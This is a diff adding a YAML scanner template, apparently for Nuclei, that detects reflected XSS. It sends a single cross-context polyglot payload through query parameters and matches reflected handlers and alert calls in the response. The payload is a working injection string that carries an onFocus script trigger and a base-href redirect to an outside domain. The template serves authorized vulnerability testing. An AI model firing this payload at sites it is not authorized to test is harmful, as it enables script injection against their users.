@@ -1,0 +1,46 @@
+id: xss-polyglot
+name: XSS Polyglot Payload Detection
+version: 1.0
+author: GochaOqradze, BRuteLogic, RodoAssis
+severity: high
+description: >
+  Detects XSS vulnerabilities using a polyglot payload designed to trigger
+  in multiple contexts simultaneously (HTML, JavaScript, URL, etc.).
+  The payload attempts to break out of various encoding and context
+  boundaries to achieve script execution.
+
+tags:
+  - xss
+  - polyglot
+  - injection
+  - client-side
+
+requests:
+  - method: GET
+    path:
+      - "/search?q={{payload}}"
+      - "/page?name={{payload}}"
+      - "/view?data={{payload}}"
+
+    redirects: true
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert?.(1)"
+          - "(alert)(1)"
+          - "OnFocus="
+          - "contentEditable"
+        condition: or
+
+      - type: regex
+        regex:
+          - "<[^>]+(onload|onerror|onfocus|onmouseover)\\s*="
+        condition: or
